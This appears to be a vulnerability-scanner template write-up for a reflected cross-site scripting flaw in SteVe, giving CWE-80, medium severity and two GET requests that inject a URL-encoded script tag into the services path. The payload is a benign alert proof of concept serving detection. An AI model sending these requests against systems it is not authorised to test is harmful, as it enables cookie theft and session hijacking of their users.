# Nuclei Template: SteVe - Cross-Site Scripting
**Template ID:** steve-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`steve-xss.yaml`)

## Vulnerability Information & PoC

## Description
SteVe contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
GET {{BaseURL}}/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
```

## References
- https://github.com/steve-community/steve
